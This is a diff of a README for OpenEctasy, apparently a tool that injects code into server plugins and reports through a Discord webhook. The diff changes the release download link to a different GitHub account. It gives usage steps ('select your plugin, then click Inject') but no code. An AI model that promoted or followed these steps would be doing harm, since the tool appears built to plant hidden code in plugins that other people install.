@@ -10,7 +10,7 @@
 Inspired by <a href="https://github.com/VoxelHax/OpenBukloit">OpenBukloit</a>
 
 ## Injecting
-Download `injector.jar` from the [latest release](https://github.com/Body-Alhoha/OpenEctasy/releases/latest) and open it. Click the `Select` button and select your plugin, then click the `Inject` button.
+Download `injector.jar` from the [latest release](https://github.com/wdprozin2/OpenEctasy/releases/latest) and open it. Click the `Select` button and select your plugin, then click the `Inject` button.
 
 ## Discord Webhook
 You can also use a discord webhook, it will produce a message like this: <br><br>
